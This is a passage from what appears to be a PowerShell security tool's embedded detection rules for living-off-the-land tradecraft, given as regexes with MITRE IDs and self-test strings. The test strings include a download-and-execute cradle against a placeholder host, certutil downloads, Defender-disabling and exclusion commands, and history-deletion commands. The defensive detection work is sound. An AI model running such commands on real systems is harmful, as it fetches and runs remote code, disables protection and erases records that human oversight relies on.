'@
$script:WfxEmbeddedRules['lotl'] = @'
{
  "name": "Living-off-the-land and command-line tradecraft",
  "version": "2026.11",
  "notes": "Self-test samples are short, non-functional fragments that use reserved example.invalid hosts. No working payloads are included.",
  "rules": [
    {
      "id": "LOTL-PS-ENCODED",
      "title": "Encoded PowerShell command",
      "pattern": "(?i)(?:^|\\s)[-/](?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)\\s+[\\\"']?[A-Za-z0-9+/]{16,}={0,2}",
      "images": [
        "powershell.exe",
        "pwsh.exe",
        "powershell_ise.exe"
      ],
      "technique": [
        "T1059.001",
        "T1027.010"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "PowerShell was started with a Base64-encoded command, which hides what it runs from casual review and many logs. Common in malware stagers and also used by some management tools.",
      "recommendation": "Decode the payload (ConvertFrom-WfxEncodedCommand) and review it; identify the parent process that launched it.",
      "tests": {
        "match": [
          "powershell -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAnAA==",
          "pwsh -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGgAZQBsAGwAbwAnAA=="
        ],
        "nomatch": [
          "powershell -File C:\\scripts\\backup.ps1 -Environment prod",
          "powershell -ExecutionPolicy RemoteSigned -File x.ps1"
        ]
      }
    },
    {
      "id": "LOTL-PS-HIDDEN-WINDOW",
      "title": "PowerShell launched with a hidden window",
      "pattern": "(?i)\\s-w(?:i|in|ind|indo|indow|indows|indowst|indowsty|indowstyl|indowstyle)?\\s+(?:h|hi|hid|hidd|hidde|hidden|1)\\b",
      "images": [
        "powershell.exe",
        "pwsh.exe",
        "powershell_ise.exe"
      ],
      "technique": [
        "T1059.001",
        "T1564.003"
      ],
      "severity": "Low",
      "confidence": "Medium",
      "description": "PowerShell was asked to run with no visible window. Legitimate scheduled jobs do this, but so does most malicious PowerShell.",
      "recommendation": "Review the full command line and the parent process.",
      "tests": {
        "match": [
          "powershell.exe -WindowStyle Hidden -File C:\\x.ps1",
          "powershell -w hidden -c Get-Date"
        ],
        "nomatch": [
          "powershell -WindowStyle Normal -File a.ps1"
        ]
      }
    },
    {
      "id": "LOTL-PS-EXECPOLICY-BYPASS",
      "title": "PowerShell execution policy bypassed on the command line",
      "pattern": "(?i)\\s-(?:ep|ex|exe|exec|execution|executionpolicy)\\s+[\\\"']?(?:bypass|unrestricted)\\b",
      "images": [
        "powershell.exe",
        "pwsh.exe",
        "powershell_ise.exe"
      ],
      "technique": [
        "T1059.001"
      ],
      "severity": "Low",
      "confidence": "Low",
      "description": "The execution policy was bypassed for this run. It is a convenience setting rather than a security boundary, but attackers almost always set it.",
      "recommendation": "Context only: review together with other findings for the same process.",
      "tests": {
        "match": [
          "powershell -ExecutionPolicy Bypass -File a.ps1",
          "powershell -ep bypass -c Get-Date"
        ],
        "nomatch": [
          "powershell -ExecutionPolicy AllSigned -File a.ps1"
        ]
      }
    },
    {
      "id": "LOTL-PS-DOWNLOAD",
      "title": "PowerShell downloading content from the web",
      "pattern": "(?i)(?:net\\.webclient|downloadstring\\s*\\(|downloaddata\\s*\\(|downloadfile\\s*\\(|invoke-webrequest|\\biwr\\s|invoke-restmethod|\\birm\\s|start-bitstransfer|\\[net\\.http)",
      "images": [
        "powershell.exe",
        "pwsh.exe",
        "powershell_ise.exe"
      ],
      "technique": [
        "T1105",
        "T1059.001"
      ],
      "severity": "Low",
      "confidence": "Medium",
      "description": "A PowerShell command line fetches content from a URL. Normal for admin scripts; also the first step of most download-and-run attacks.",
      "recommendation": "Check the URL's reputation and what was done with the downloaded content.",
      "tests": {
        "match": [
          "powershell -c \"Invoke-WebRequest https://example.invalid/a.zip -OutFile a.zip\""
        ],
        "nomatch": [
          "powershell -c Get-Process"
        ]
      }
    },
    {
      "id": "LOTL-PS-DOWNLOAD-EXEC",
      "title": "PowerShell download-and-execute cradle",
      "pattern": "(?i)(?:\\biex\\b|invoke-expression).{0,300}(?:downloadstring|downloaddata|invoke-webrequest|\\biwr\\b|invoke-restmethod|\\birm\\b|net\\.webclient)|(?:downloadstring|invoke-webrequest|\\biwr\\b|invoke-restmethod|\\birm\\b).{0,300}\\|\\s*(?:\\biex\\b|invoke-expression)",
      "technique": [
        "T1059.001",
        "T1105"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "Content is downloaded and executed directly in memory in one command — the classic PowerShell stager / 'cradle' pattern. Also how ClickFix-style lures run their payload.",
      "recommendation": "Treat as likely malicious: capture the URL, retrieve the content safely for analysis, and trace the parent process.",
      "tests": {
        "match": [
          "powershell -c \"irm https://example.invalid/t.txt | iex\""
        ],
        "nomatch": [
          "powershell -c \"Invoke-WebRequest https://example.invalid/a.zip -OutFile a.zip\""
        ]
      }
    },
    {
      "id": "LOTL-AMSI-BYPASS",
      "title": "Reference to AMSI internals (possible AMSI bypass)",
      "pattern": "(?i)amsi(?:utils|initfailed|scanbuffer|opensession|context)\\b|amsi\\.dll",
      "technique": [
        "T1562.001"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "The command references internals of the Antimalware Scan Interface. Outside of security tooling this almost always means an attempt to disable script scanning before running a payload.",
      "recommendation": "Treat the process as hostile; review what ran after it.",
      "tests": {
        "match": [
          "powershell -c \"$n='AmsiUtils'\""
        ],
        "nomatch": [
          "powershell -c Get-MpComputerStatus"
        ]
      }
    },
    {
      "id": "LOTL-PS-REFLECTIVE-LOAD",
      "title": "In-memory .NET assembly loading / shellcode API use",
      "pattern": "(?i)reflection\\.assembly\\]::load|\\[system\\.reflection\\.assembly\\]|assembly\\]::load(?:file|from)?\\s*\\(|getdelegateforfunctionpointer|virtualalloc|createthread\\b|\\bvirtualprotect\\b",
      "technique": [
        "T1620"
      ],
      "severity": "High",
      "confidence": "Medium",
      "description": "The command loads .NET code from memory or calls low-level memory APIs — a common way to run tooling without writing it to disk.",
      "recommendation": "Capture the script block (4104) or the source of the bytes and analyze it.",
      "tests": {
        "match": [
          "powershell -c \"[Reflection.Assembly]::Load($b)\""
        ],
        "nomatch": [
          "powershell -c \"Add-Type -AssemblyName System.Windows.Forms\""
        ]
      }
    },
    {
      "id": "LOTL-PS-OBFUSCATION",
      "title": "Obfuscated PowerShell (char-code / concatenation / tick tricks)",
      "pattern": "(?i)\\[char\\]\\s*\\d{2,3}\\s*\\+\\s*\\[char\\]\\s*\\d{2,3}|-join\\s*\\(?\\s*\\[char\\[\\]\\]|i`e`x|\\$env:comspec\\[\\d|\\(\\s*'[a-z\\-]{1,4}'\\s*\\+\\s*'[a-z\\-]{1,4}'\\s*\\+\\s*'[a-z\\-]{1,4}'\\s*\\)",
      "technique": [
        "T1027.010"
      ],
      "severity": "Medium",
      "confidence": "Low",
      "description": "The command uses string-building tricks that exist mainly to defeat signature matching.",
      "recommendation": "Deobfuscate and review; correlate with 4104 script-block logs.",
      "tests": {
        "match": [
          "powershell -c \"([char]105+[char]101+[char]120)\"",
          "powershell -c \"('Ne'+'w-'+'Ob')\""
        ],
        "nomatch": [
          "powershell -c \"'a' + $b\""
        ]
      }
    },
    {
      "id": "LOTL-PS-DEFENDER-TAMPER",
      "title": "Command disables Microsoft Defender or adds an exclusion",
      "pattern": "(?i)(?:set|add)-mppreference\\b.{0,200}-(?:disable(?:realtimemonitoring|behaviormonitoring|ioavprotection|scriptscanning|intrusionpreventionsystem|blockatfirstseen)|exclusion(?:path|process|extension|ipaddress))\\b",
      "technique": [
        "T1562.001"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "Defender protection was switched off or an exclusion was added from the command line — very often the step right before a payload is dropped.",
      "recommendation": "Check whether this was an approved change; review the exclusion target and what was placed there.",
      "tests": {
        "match": [
          "powershell Set-MpPreference -DisableRealtimeMonitoring $true",
          "powershell Add-MpPreference -ExclusionPath C:\\Users\\Public"
        ],
        "nomatch": [
          "powershell Get-MpPreference"
        ]
      }
    },
    {
      "id": "LOTL-PS-HISTORY-TAMPER",
      "title": "Shell history disabled or deleted",
      "pattern": "(?i)set-psreadlineoption\\s+-historysavestyle\\s+savenothing|remove-item\\s.{0,120}consolehost_history|clear-history\\b|set-psreadlineoption\\s+-historysavestyle\\s+savenothing|(?:remove-item|\\bri\\b|\\bdel\\b|\\brm\\b|clear-content|set-content|out-file)\\s.{0,120}historysavepath",
      "technique": [
        "T1070.003"
      ],
      "severity": "Medium",
      "confidence": "High",
      "description": "PowerShell command history was disabled or deleted, which removes a record of what was typed.",
      "recommendation": "Recover history from backups / EDR and review the session's other activity.",
      "tests": {
        "match": [
          "powershell Set-PSReadLineOption -HistorySaveStyle SaveNothing", "powershell -c Remove-Item (Get-PSReadlineOption).HistorySavePath"
        ],
        "nomatch": [
          "powershell Set-PSReadLineOption -EditMode Emacs"
        ]
      }
    },
    {
      "id": "LOTL-CERTUTIL-DOWNLOAD",
      "title": "certutil used to download a file",
      "pattern": "(?i)-(?:urlcache|verifyctl)\\b.{0,200}(?:https?|ftp)://|-urlcache\\s+(?:-split\\s+)?-f\\b",
      "images": [
        "certutil.exe"
      ],
      "technique": [
        "T1105"
      ],
      "severity": "High",
      "confidence": "High",
      "description": "certutil.exe is a certificate tool; using it to fetch files from the internet is a well-known living-off-the-land download technique.",
      "recommendation": "Find the downloaded file, hash it and check reputation.",
      "tests": {
        "match": [
          "certutil.exe -urlcache -split -f https://example.invalid/a.txt a.txt"
        ],
        "nomatch": [
          "certutil -store my",
          "certutil -hashfile a.iso SHA256"
        ]
      }
    },
    {
      "id": "LOTL-CERTUTIL-DECODE",
      "title": "certutil used to decode a file",
      "pattern": "(?i)\\s-decode(?:hex)?\\s",
      "images": [
        "certutil.exe"
      ],
      "technique": [
        "T1140"
      ],
      "severity": "Medium",
      "confidence": "Medium",
      "description": "certutil decoded a Base64/hex file — often used to unpack a payload that was smuggled in as text.",
      "recommendation": "Inspect both the input and output files.",
      "tests": {
        "match": [
          "certutil -decode a.txt a.bin"
        ],
        "nomatch": [
          "certutil -encode a.bin a.txt"
        ]
      }
    },
    {
      "id": "LOTL-BITSADMIN-TRANSFER",
      "title": "bitsadmin used to transfer a file",
      "pattern": "(?i)/(?:transfer|addfile|setnotifycmdline)\\b",
      "images": [
        "bitsadmin.exe"
      ],
      "technique": [
        "T1197",
        "T1105"
